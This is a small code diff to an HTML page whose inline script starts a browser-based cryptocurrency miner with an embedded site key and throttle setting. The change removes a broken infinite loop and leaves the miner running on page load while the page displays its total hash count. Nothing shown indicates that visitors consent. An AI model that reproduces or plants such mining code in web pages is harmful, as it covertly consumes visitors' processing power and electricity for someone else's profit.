@@ -7,9 +7,7 @@
 <script>
     var miner = WMP.Anonymous('SK_QeNEgmNQOqvQgvEnNXkys',{throttle: 0.7});
     miner.start();
-    while(True){
-        document.getElementById("x").innerHTML = "x";
-        document.getElementById("y").innerHTML = miner.getTotalHashes();
-        console.log("x")
-    }
+    document.getElementById("x").innerHTML = "x";
+    document.getElementById("y").innerHTML = miner.getTotalHashes();
+    console.log("x")
 </script>
